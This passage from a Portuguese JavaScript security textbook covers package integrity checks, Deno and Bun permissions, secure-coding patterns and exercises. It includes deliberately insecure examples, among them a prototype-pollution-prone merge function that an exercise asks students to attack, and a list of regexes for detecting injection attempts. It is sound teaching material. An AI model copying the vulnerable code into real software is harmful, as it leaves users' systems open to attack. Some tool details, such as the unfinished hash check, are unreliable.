// Script de verificacao de integridade
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

function verifyPackageIntegrity(nodeModulesDir) {
    const packageLock = JSON.parse(
        fs.readFileSync(path.join(process.cwd(), 'package-lock.json'), 'utf8')
    );

    const issues = [];

    for (const [name, info] of Object.entries(packageLock.packages || {})) {
        if (!name) continue; // root package

        const pkgPath = path.join(nodeModulesDir, name, 'package.json');
        const pkgJson = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));

        // Verificar versao
        if (pkgJson.version !== info.version) {
            issues.push({
                package: name,
                expected: info.version,
                actual: pkgJson.version,
                issue: 'Version mismatch'
            });
        }

        // Verificar integrity hash se disponivel
        if (info.integrity) {
            const installedHash = calculateHash(
                path.join(nodeModulesDir, name)
            );
            // Comparar com hash registrado
        }
    }

    return issues;
}

function calculateHash(dir) {
    const files = fs.readdirSync(dir, { recursive: true });
    const hash = crypto.createHash('sha512');

    files.sort().forEach(file => {
        const filePath = path.join(dir, file);
        if (fs.statSync(filePath).isFile()) {
            const content = fs.readFileSync(filePath);
            hash.update(content);
        }
    });

    return hash.digest('hex');
}
```

### 12.12.6 npm Overrides e Resolucao

```json
// package.json -- forcar versao especifica de sub-dependencia
{
    "overrides": {
        "lodash": "4.17.21",
        "minimist": ">=1.2.8",
        "semver": ">=7.5.2"
    }
}
```

### 12.12.7 Husky e Pre-commit Hooks

```javascript
// pre-commit hook para verificacao
// .husky/pre-commit:
#!/bin/sh
npm audit --omit=dev
npm outdated

// package.json
{
    "scripts": {
        "prepare": "husky install"
    },
    "devDependencies": {
        "husky": "^9.0.0"
    }
}
```

---

## 12.13 Modelos de Seguranca: Deno e Bun

### 12.13.1 Deno -- Seguranca por Padrao

Deno inverte o modelo de seguranca do Node.js: por padrao, scripts nao podem acessar filesystem, rede, ou ambiente. O desenvolvedor deve conceder permissoes explicitamente:

```bash
# Sem permissoes -- bloqueia tudo
deno run script.js
# Erro: UnhandledPromiseRejection: PermissionDenied

# Com permissoes especificas
deno run --allow-read --allow-net=api.example.com script.js

# Com todas as permissoes (perigoso)
deno run --allow-all script.js
```

**Sistema de permissoes do Deno:**

| Permissao | Flag | Descricao |
|-----------|------|-----------|
| Leitura de arquivo | `--allow-read` | Acessar filesystem |
| Escrita de arquivo | `--allow-write` | Modificar filesystem |
| Rede | `--allow-net` | Conectar a rede |
| Ambiente | `--allow-env` | Ler variaveis de ambiente |
| Execucao | `--allow-run` | Executar processos |
| Carregamento | `--allow-ffi` | FFI (Foreign Function Interface) |
| Alto nivel | `--allow-hrtime` | Acesso a high-resolution time |
| Tudo | `--allow-all` | Todas as permissoes |

```bash
# Permissoes granulares
deno run \
  --allow-read=/home/user/project \
  --allow-write=/home/user/project/output \
  --allow-net=api.example.com,cdn.example.com \
  --allow-env=API_KEY,DATABASE_URL \
  --no-allow-run \
  script.js
```

### 12.13.2 Deno -- Auditoria de Importacoes

```bash
# Verificar importacoes por URL
deno info script.js

# Analise estatica de seguranca
deno lint script.js

# Verificar licencas e dependencias
deno outdated
```

```javascript
// Deno -- imports seguros
// Importacao de URL com integrity check
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Importacao com import map
// import_map.json:
{
    "imports": {
        "std/": "https://deno.land/std@0.200.0/",
        "third_party/": "https://deno.land/x/"
    }
}

// Deno -- permissao no runtime
Deno.permissions.query({ name: 'read', path: '/tmp' })
    .then(status => {
        console.log(status.state); // "granted", "denied", ou "prompt"
    });

// Verificar permissoes antes de usar
if ((await Deno.permissions.query({ name: 'net' })).state !== 'granted') {
    throw new Error('Net permission required');
}
```

### 12.13.3 Bun -- Modelo de Seguranca

Bun e um runtime JavaScript rapido que usa JavaScriptCore ao inves de V8. Sua abordagem de seguranca combina elementos do Node.js e Deno:

```bash
# Bun -- execucao basica
bun run script.js

# Bun -- instalacao de pacotes com verificacao
bun install --frozen-lockfile

# Bun -- testes
bun test
```

**Caracteristicas de seguranca do Bun:**

```javascript
// Bun -- module resolution seguro
// Bun resolve imports de forma deterministica
// e verifica hashes quando disponivel

// Bun -- fetch nativo com suporte a TLS
const response = await fetch('https://api.example.com/data', {
    // Bun usa certificates do sistema por padrao
    // Pode configurar CA customizada
});

// Bun -- SQLite com sandboxing
import { Database } from "bun:sqlite";
const db = new Database(":memory:");
// SQLite em memoria nao tem risco de filesystem

// Bun -- subprocess com restricoes
const proc = Bun.spawn(["ls", "-la"], {
    cwd: "/tmp",
    stdout: "pipe",
    stderr: "pipe",
    env: { PATH: "/usr/bin" }  // ambiente controlado
});

// Bun -- testes com isolamento
Bun.test("example", () => {
    expect(1 + 1).toBe(2);
    // Testes rodam em isolamento
});
```

### 12.13.4 Comparacao dos Tres Runtimes

| Caracteristica | Node.js | Deno | Bun |
|---------------|---------|------|-----|
| Permissoes por padrao | Tudo permitido | Tudo bloqueado | Tudo permitido |
| Gestao de pacotes | npm/yarn/pnpm | import maps | bun install |
| Verificacao de integridade | Lockfile | Import maps + integrity | Lockfile |
| Isolamento de script | vm (limitado) | Permicoes granulares | Nenhum |
| Type checking | TypeScript via ferramenta | TypeScript nativo | TypeScript nativo |
| Sandboxing | Manual (containers) | Built-in | Nenhum |
| Auditoria | npm audit | deno audit | bun audit (limitado) |

### 12.13.5 Migracao para Deno -- Checklist

```markdown
## Checklist de Migracao Node.js -> Deno

### Dependencias
- [ ] Substituir require() por import
- [ ] Remover node_modules/
- [ ] Criar import_map.json
- [ ] Verificar licencas de dependencias

### APIs Nativas
- [ ] Substituir fs por Deno.readFile/writeFile
- [ ] Substituir http por std/http
- [ ] Substituir crypto por Web Crypto API
- [ ] Substituir process por Deno.args/env

### Seguranca
- [ ] Remover --allow-all flags
- [ ] Configurar permissoes granulares
- [ ] Implementar verificacao de permissoes no runtime
- [ ] Auditar importacoes de URLs externas

### Testes
- [ ] Migrar testes para deno test
- [ ] Configurar permissoes para testes
- [ ] Verificar cobertura de seguranca

---

## 12.14 Padroes de Codificacao Segura em JavaScript

### 12.14.1 Principios Fundamentais

Os principios de seguranca em JavaScript seguem os mesmos fundamentos da seguranca de software, mas com adaptacoes especificas para o ecossistema web:

**Defense in Depth (Defesa em Profundidade):**

```javascript
// Nunca confie em uma unica camada de protecao
// Combine validacao, sanitizacao, CSP, e encoding

// Camada 1: Validacao de entrada
function validateEmail(email) {
    const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!pattern.test(email)) {
        throw new Error('Invalid email');
    }
    return email;
}

// Camada 2: Sanitizacao
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

// Camada 3: Output encoding
function encodeForHTML(input) {
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// Camada 4: CSP
// Content-Security-Policy: script-src 'nonce-{random}'
```

**Principle of Least Privilege (Menor Privilegio):**

```javascript
// Nao solicite permissoes que nao precisa
// Use APIs que ja tenham as restricoes adequadas

// VULNERAVEL: pedido de permissoes excessivas
navigator.geolocation.getCurrentPosition(
    (pos) => { /* usar posicao */ },
    (err) => { /* tratar erro */ },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
);

// SEGURO: usar a API mais restritiva possivel
// Se so precisa de cidade, use geocoding ao inves de GPS preciso
// Se nao precisa de localizacao, nao solicite
```

**Fail Securely (Falhar com Seguranca):**

```javascript
// Sempre assuma que a falha e um ataque
async function fetchData(userId) {
    try {
        const response = await fetch(`/api/users/${userId}`);
        if (!response.ok) {
            // Nao retorne dados parciais
            throw new Error(`HTTP ${response.status}`);
        }
        return await response.json();
    } catch (error) {
        // Nao exponha detalhes do erro ao cliente
        console.error('Server error:', error);
        throw new Error('Internal server error');
    }
}

// VULNERAVEL: expor stack trace
app.use((err, req, res, next) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack // NUNCA faca isso
    });
});

// SEGURO: logar internamente, retornar mensagem generica
app.use((err, req, res, next) => {
    console.error('Unhandled error:', {
        message: err.message,
        stack: err.stack,
        url: req.url,
        userId: req.user?.id
    });

    res.status(500).json({
        error: 'An unexpected error occurred'
    });
});
```

### 12.14.2 Tratamento de Erros Seguro

```javascript
// 1. Nunca use try/catch vazio
// VULNERAVEL:
try {
    riskyOperation();
} catch (e) {
    // silenciar erro -- atacante nao ve feedback
}

// SEGURO: tratar erro adequadamente
try {
    riskyOperation();
} catch (error) {
    console.error('Operation failed:', error.message);
    logToSecurityMonitor({ error: error.message, context: 'riskyOperation' });
    userFacingError('Operation failed. Please try again.');
}

// 2. Unhandled promise rejections
// SEMPRE tratar rejections
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Em producao: encerrar gracefulmente
    process.exit(1);
});

// 3. Error boundaries (React)
class ErrorBoundary extends React.Component {
    constructor(props) {
        super(props);
        this.state = { hasError: false, error: null };
    }

    static getDerivedStateFromError(error) {
        return { hasError: true, error };
    }

    componentDidCatch(error, errorInfo) {
        // Logar erro, nao expor ao usuario
        console.error('Component error:', error, errorInfo);
    }

    render() {
        if (this.state.hasError) {
            // Fallback seguro -- nao expor stack trace
            return <h1>Algo deu errado.</h1>;
        }
        return this.props.children;
    }
}
```

### 12.14.3 Gerenciamento de Secrets no Frontend

```javascript
// REGRA: NUNCA coloque secrets no frontend
// Todo dado que chega ao browser pode ser lido por qualquer pessoa

// VULNERAVEL: API key no frontend
const API_KEY = 'sk-1234567890abcdef'; // NUNCA faca isso
fetch(`https://api.stripe.com/v1/charges?key=${API_KEY}`);

// SEGURO: usar backend como proxy
// Backend:
app.post('/api/create-charge', authenticate, async (req, res) => {
    const charge = await stripe.charges.create({
        amount: req.body.amount,
        currency: 'brl',
        source: req.body.token
        // API key esta apenas no servidor
    });
    res.json(charge);
});

// Frontend:
fetch('/api/create-charge', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ amount: 1000, token: 'tok_...' })
});

// 2. Se usar VAPID keys (Push Notifications)
// Public key pode estar no frontend
const publicVapidKey = 'BKx...'; // OK no frontend

// Private key APENAS no servidor
// process.env.VAPID_PRIVATE_KEY; // OK no servidor

// 3. Tokens de autenticacao
// NUNCA armazene JWT em localStorage (vulneravel a XSS)
// Use HttpOnly, Secure, SameSite cookies

// VULNERAVEL:
localStorage.setItem('token', jwt);

// SEGURO:
// Cookie HttpOnly (definido pelo servidor):
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 12.14.4 Validacao de Dados com Schema

```javascript
// Usar Zod para validacao robusta
import { z } from 'zod';

// Definir schemas de entrada
const UserSchema = z.object({
    name: z.string().min(1).max(100).regex(/^[a-zA-Z\s]+$/),
    email: z.string().email().max(255),
    age: z.number().int().min(0).max(150),
    role: z.enum(['user', 'admin', 'moderator'])
});

// Validar entrada
app.post('/api/users', (req, res) => {
    try {
        const validated = UserSchema.parse(req.body);
        // validated e tipado e validado
        createUser(validated);
        res.status(201).json({ success: true });
    } catch (error) {
        if (error instanceof z.ZodError) {
            res.status(400).json({
                error: 'Validation failed',
                details: error.errors
            });
        } else {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
});

// Valores padrao para campos opcionais
const ConfigSchema = z.object({
    timeout: z.number().default(5000),
    retries: z.number().min(0).max(10).default(3),
    baseUrl: z.string().url().default('https://api.example.com')
});
```

### 12.14.5 Padroes de Autenticacao em JavaScript

```javascript
// 1. Geracao segura de tokens
import crypto from 'crypto';

function generateToken(length = 32) {
    return crypto.randomBytes(length).toString('hex');
}

// 2. Hash de senha com bcrypt
import bcrypt from 'bcrypt';

async function hashPassword(password) {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}

// 3. JWT com configuracao segura
import jwt from 'jsonwebtoken';

function generateAccessToken(user) {
    return jwt.sign(
        { userId: user.id, role: user.role },
        process.env.JWT_SECRET,
        {
            expiresIn: '15m', // curto
            algorithm: 'HS256',
            issuer: 'myapp',
            audience: 'myapp-users'
        }
    );
}

function verifyAccessToken(token) {
    return jwt.verify(token, process.env.JWT_SECRET, {
        algorithms: ['HS256'], // especificar algoritmos permitidos
        issuer: 'myapp',
        audience: 'myapp-users'
    });
}

// 4. Refresh tokens com rotação
function generateRefreshToken(user) {
    const token = generateToken(64);
    // Armazenar hash do token no banco
    const hash = crypto.createHash('sha256').update(token).digest('hex');

    db.refreshTokens.create({
        userId: user.id,
        tokenHash: hash,
        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 dias
        createdAt: new Date()
    });

    return token;
}
```

### 12.14.6 Protecao contra Ataques Comuns

```javascript
// 1. Rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 tentativas
    message: 'Too many login attempts',
    standardHeaders: true,
    legacyHeaders: false
});

app.post('/api/login', loginLimiter, loginHandler);

// 2. CSRF protection
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

// 3. Input sanitization contra XSS
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

function sanitizeHTML(input) {
    return purify.sanitize(input, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'title']
    });
}

// 4. Headers de seguranca (helmet)
import helmet from 'helmet';

app.use(helmet());
// Adiciona automaticamente:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 0 (recomendado desabilitar em favor de CSP)
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// Content-Security-Policy (configuravel)
// Referrer-Policy: no-referrer
// Permissions-Policy: camera=(), microphone=()
```

### 12.14.7 Logging e Monitoramento de Seguranca

```javascript
// Nunca logar dados sensiveis
function sanitizeLogData(data) {
    const sensitiveFields = [
        'password', 'token', 'secret', 'authorization',
        'cookie', 'ssn', 'creditCard', 'cvv'
    ];

    const sanitized = { ...data };
    for (const field of sensitiveFields) {
        if (sanitized[field]) {
            sanitized[field] = '[REDACTED]';
        }
    }
    return sanitized;
}

// Logger estruturado
function logSecurityEvent(event) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        level: event.level,
        type: event.type,
        message: event.message,
        userId: event.userId,
        ip: event.ip,
        userAgent: event.userAgent,
        url: event.url,
        method: event.method,
        statusCode: event.statusCode,
        // NUNCA logar:
        // - passwords
        // - tokens
        // - credit card numbers
        // - PII desnecessario
    };

    console.log(JSON.stringify(logEntry));
}

// Monitorar eventos suspeitos
app.use((req, res, next) => {
    const suspiciousPatterns = [
        /\.\.\//,  // path traversal
        /<script/i, // XSS
        /union.*select/i, // SQL injection
        /exec\(|eval\(/i, // code injection
        /\bOR\b.*\b1\b.*=.*\b1\b/i // SQL tautology
    ];

    const testString = `${req.url} ${JSON.stringify(req.query)} ${JSON.stringify(req.body)}`;

    for (const pattern of suspiciousPatterns) {
        if (pattern.test(testString)) {
            logSecurityEvent({
                level: 'WARN',
                type: 'SUSPICIOUS_INPUT',
                message: `Suspicious pattern detected: ${pattern}`,
                ip: req.ip,
                url: req.url,
                method: req.method
            });
            break;
        }
    }

    next();
});
```

### 12.14.8 Checklist de Seguranca para JavaScript

```markdown
## Frontend
- [ ] CSP configurado e ativo
- [ ] Trusted Types habilitado (se aplicavel)
- [ ] SRI para todos os scripts/estilos externos
- [ ] Nenhum secret no frontend
- [ ] Input validation em todos os campos
- [ ] Output encoding para HTML/JS/URL/CSS
- [ ] DOMPurify para HTML dinamico
- [ ] SameSite cookies configurados
- [ ] HTTPS forçado
- [ ] X-Frame-Options ou frame-ancestors ativo
- [ ] Subresource Integrity em CDN scripts
- [ ] Nenhum eval() ou new Function()
- [ ] Nenhum innerHTML com dados do usuario
- [ ] postMessage com validacao de origin
- [ ] Service Worker com escopo restrito

## Backend (Node.js)
- [ ] Helmet configurado
- [ ] Rate limiting ativo
- [ ] Input validation com schema
- [ ] Parameterized queries (SQL injection)
- [ ] Error handling sem exposicao de stack traces
- [ ] Secrets em variaveis de ambiente
- [ ] npm audit rodando na CI
- [ ] Dependencias com versoes fixadas
- [ ] Scripts de pos-instalacao bloqueados
- [ ] child_process com argumentos separados
- [ ] CORS configurado adequadamente
- [ ] Logging sem dados sensiveis
- [ ] Timeout em operacoes assincronas
- [ ] Prototype pollution protection
- [ ] Worker threads para computacao pesada
```

---

## 12.15 Exercicios

### Exercicio 1 -- Configuracao de CSP

**Objetivo:** Configurar CSP para uma aplicacao React.

**Cenario:** Voce tem uma aplicacao React que usa jQuery de CDN, Google Analytics, e fontes do Google Fonts.

**Tarefa:**

a) Crie uma politica CSP que permita essas funcionalidades sem usar `'unsafe-inline'` ou `'unsafe-eval'`.

b) Implemente a geracao de nonces no servidor Express.

c) Configure Trusted Types para proteger contra DOM XSS.

d) Crie um endpoint de relatorio de violacoes de CSP.

**Requisitos minimos:**
- Script-src com nonce para jQuery e Google Analytics
- Style-src para Google Fonts
- Font-src para Google Fonts
- Connect-src para Google Analytics
- Report-uri configurado

### Exercicio 2 -- Prevencao de Prototype Pollution

**Objetivo:** Identificar e corrigir prototype pollution em um projeto.

**Cenario:** Um modulo de merge de configuracao aceita JSON do usuario:

```javascript
// config-merger.js
function mergeConfig(defaults, userConfig) {
    for (const key in userConfig) {
        if (typeof userConfig[key] === 'object' && userConfig[key] !== null) {
            defaults[key] = defaults[key] || {};
            mergeConfig(defaults[key], userConfig[key]);
        } else {
            defaults[key] = userConfig[key];
        }
    }
    return defaults;
}
```

**Tarefa:**

a) Demonstre o ataque de prototype pollution usando este modulo.

b) Implemente uma versao segura que bloqueia `__proto__`, `constructor`, e `prototype`.

c) Escreva testes que verificam que a protecao funciona.

d) Implemente uma solucao usando `Object.create(null)`.

### Exercicio 3 -- Subresource Integrity

**Objetivo:** Implementar SRI em um pipeline de build.

**Cenario:** Seu projeto carrega Bootstrap, Font Awesome, e jQuery de CDN.

**Tarefa:**

a) Gere hashes SHA-384 para cada arquivo da CDN.

b) Implemente um plugin webpack que adiciona SRI automaticamente.

c) Configure fallback para browsers sem suporte a SRI.

d) Crie script de build que atualiza hashes quando as versoes mudam.

### Exercicio 4 -- Sandboxing com Node.js

**Objetivo:** Implementar sandbox para executar JavaScript de usuarios.

**Cenario:** Voce tem um editor de codigo online que precisa executar snippets de JavaScript de forma segura.

**Tarefa:**

a) Implemente sandbox usando `vm` module com contexto isolado.

b) Implemente sandbox usando Docker com restricoes de rede, memoria e filesystem.

c) Implemente sandbox usando Worker threads.

d) Compare as tres abordagens em termos de seguranca, performance, e complexidade.

e) Crie testes que verificam que o sandbox nao permite acesso a recursos proibidos.

### Exercicio 5 -- Auditoria de Supply Chain

**Objetivo:** Configurar pipeline de seguranca para dependencias.

**Cenario:** Seu projeto usa 50+ dependencias npm.

**Tarefa:**

a) Configure Dependabot ou Renovate para atualizacoes automaticas.

b) Implemente pre-commit hook que roda `npm audit`.

c) Configure Snyk ou similar para monitoramento continuo.

d) Crie dashboard que mostra status de seguranca das dependencias.

e) Documente processo de resposta a vulnerability disclosure.

### Exercicio 6 -- Seguranca de Web Worker

**Objetivo:** Implementar processamento seguro em Web Workers.

**Cenario:** Voce tem um Worker que processa dados de usuarios (potencialmente maliciosos).

**Tarefa:**

a) Implemente validacao de mensagens recebidas no Worker.

b) Implemente timeout para evitar execucao infinita.

c) Implemente comunicacao segura entre main thread e Worker.

d) Teste que o Worker nao pode acessar DOM ou recursos do main thread.

### Exercicio 7 -- Comparacao de Runtime Security

**Objetivo:** Comparar modelos de seguranca de Node.js, Deno, e Bun.

**Cenario:** Sua empresa esta considerando migrar de Node.js para Deno.

**Tarefa:**

a) Execute o mesmo script em Node.js, Deno, e Bun com restricoes de permissao.

b) Documente as diferencas de comportamento para cada permissao.

c) Implemente a mesma aplicacao (ex: API REST) nos tres runtimes.

d) Compare tempo de startup, consumo de memoria, e superficie de ataque.

e) Crie recomendacao tecnica com prós e contras.

### Exercicio 8 -- Same-Origin Policy e CORS

**Objetivo:** Entender e configurar CORS adequadamente.

**Cenario:** Voce tem uma API que serve para um frontend em dominio diferente.

**Tarefa:**

a) Implemente CORS que permita apenas o dominio do frontend.

b) Implemente preflight caching adequado.

c) Configure CORS para diferentes endpoints com niveis de acesso diferentes.

d) Demonstre ataque CORS mal configurado e como previni-lo.

e) Implemente monitoramento de violacoes CORS.

---

## 12.16 Referencias

### Especificacoes e Padroes

- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) -- W3C Recommendation
- [Trusted Types API](https://wicg.github.io/trusted-types/dist/spec/) -- W3C Draft
- [Subresource Integrity](https://www.w3.org/TR/SRI/) -- W3C Recommendation
- [Same-Origin Policy](https://html.spec.whatwg.org/multipage/origin.html#origin) -- HTML Living Standard
- [Web Workers API](https://html.spec.whatwg.org/multipage/workers.html) -- HTML Living Standard
- [Service Workers API](https://www.w3.org/TR/service-workers/) -- W3C Recommendation
- [ECMAScript Security Model](https://tc39.es/ecma262/#sec-forbidden-extendableagent-names) -- TC39

### Ferramentas de Auditoria

- [npm audit](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities) -- Auditoria nativa do npm
- [Snyk](https://snyk.io/) -- Monitoramento de vulnerabilidades
- [Dependabot](https://github.com/dependabot) -- Atualizacoes automaticas
- [Renovate](https://www.mend.io/renovate) -- Atualizacoes automaticas
- [Socket.dev](https://socket.dev/) -- Analise de supply chain
- [ESLint Security](https://github.com/nodesecurity/eslint-plugin-security) -- Regras de seguranca
- [Semgrep](https://semgrep.dev/) -- Analise estatica
- [safe-regex](https://github.com/substack/safe-regex) -- Deteccao de ReDoS
- [DOMPurify](https://github.com/cure53/DOMPurify) -- Sanitizacao de HTML

### CVEs e Vulnerabilidades

- [CVE-2020-28477](https://nvd.nist.gov/vuln/detail/CVE-2020-28477) -- lodash prototype pollution
- [CVE-2021-23337](https://nvd.nist.gov/vuln/detail/CVE-2021-23337) -- lodash template injection
- [CVE-2022-21823](https://nvd.nist.gov/vuln/detail/CVE-2022-21823) -- Node.js prototype pollution
- [CVE-2023-45133](https://nvd.nist.gov/vuln/detail/CVE-2023-45133) -- Babel code injection
- [CVE-2019-19919](https://nvd.nist.gov/vuln/detail/CVE-2019-19919) -- Handlebars prototype pollution

### Documentacao de Runtimes

- [Node.js Security](https://nodejs.org/en/docs/guides/security/) -- Guia oficial de seguranca
- [Deno Permissions](https://deno.land/manual@v1.39.0/runtime/permissions) -- Documentacao de permissoes
- [Bun Security](https://bun.sh/docs/runtime/nodejs-apis) -- Compatibilidade com Node.js
- [npm Documentation](https://docs.npmjs.com/) -- Documentacao oficial do npm

### Livros e Publicacoes

- *The Tangled Web* -- Michal Zalewski
- *Web Application Security* -- Andrew Hoffman
- *Node.js Design Patterns* -- Mario Casciaro, Luciano Mammino
- *Eloquent JavaScript* -- Marijn Haverbeke
- *JavaScript: The Definitive Guide* -- David Flanagan

### Artigos e Blog Posts

- [OWASP JavaScript Security](https://owasp.org/www-community/vulnerabilities/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Chrome DevTools Security](https://developer.chrome.com/docs/devtools/security/)
- [V8 Blog Security](https://v8.dev/blog)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)

---

> *"Seguranca nao e um produto, e um processo. No JavaScript, e um processo que comeca na primeira linha de codigo e nunca termina."*
> -- Adaptado de Bruce Schneier

---

**Proximo Capitulo**: [Capitulo 13 -- Seguranca Server-Side](13-seguranca-server-side.md) - Protegendo aplicacoes server-side com Django, Flask, Express e Go.
